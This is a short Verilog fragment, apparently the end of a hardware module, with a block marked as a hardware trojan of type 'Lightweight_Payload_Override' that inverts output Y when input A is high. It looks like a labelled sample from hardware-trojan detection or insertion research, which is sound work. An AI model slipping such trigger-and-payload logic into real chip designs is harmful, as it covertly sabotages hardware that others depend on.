// HT_START
// Trojan Type: Lightweight_Payload_Override
reg htrojan_trig;
reg htrojan_pay;
always @(*) begin
    htrojan_trig = (A == 1'b1);
    htrojan_pay = htrojan_trig ? (Y ^ 1'b1) : Y;
end
// HT_END
endmodule
